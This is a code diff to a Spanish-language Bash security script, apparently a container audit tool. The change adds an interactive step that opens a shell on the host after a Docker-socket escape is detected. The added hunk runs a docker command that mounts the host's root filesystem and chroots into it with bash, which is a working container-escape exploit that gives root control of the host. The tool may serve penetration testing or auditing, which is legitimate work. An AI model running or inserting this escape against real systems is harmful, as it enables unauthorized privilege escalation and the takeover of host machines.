@@ -1040,6 +1040,40 @@ if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v do
             alert_critical "✅ ESCAPE EXITOSO! Acceso obtenido al host"
             echo "$ESCAPE_RESULT" | sed 's/^/  /'
             ((CRITICAL++))
+
+            # Ofrecer consola interactiva
+            echo ""
+            echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            echo -e "${YELLOW}¿Quieres una consola interactiva en el host? [S/n]${NC}"
+            echo -e "${CYAN}(Escribe 'S' para abrir bash en el host escaapdo)${NC}"
+            echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            echo ""
+
+            # Leer respuesta con timeout (30 segundos)
+            read -t 30 -p "Respuesta: " INTERACTIVE_CHOICE
+
+            if [[ "$INTERACTIVE_CHOICE" =~ ^[Ss]$ ]] || [ -z "$INTERACTIVE_CHOICE" ]; then
+                echo ""
+                alert_critical "🚀 ABRIENDO CONSOLA INTERACTIVA EN HOST..."
+                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+                echo -e "${GREEN}INGRESASTE AL HOST (FUERA DEL CONTENEDOR)${NC}"
+                echo -e "${GREEN}Prompt: host# ${NC}"
+                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+                echo ""
+
+                # Abrir shell interactiva escapada
+                docker run --rm -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ bash 2>/dev/null || docker run --rm -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ sh 2>/dev/null || true
+
+                echo ""
+                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+                alert_critical "✅ Consola escapada cerrada"
+                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+                echo ""
+            else
+                info "Consola interactiva cancelada"
+                echo ""
+            fi
+
         elif echo "$ESCAPE_RESULT" | grep -q "uid=0"; then
             alert_high "⚠️  Ejecutado con uid=0 (root)"
             echo "$ESCAPE_RESULT" | head -5 | sed 's/^/  /'
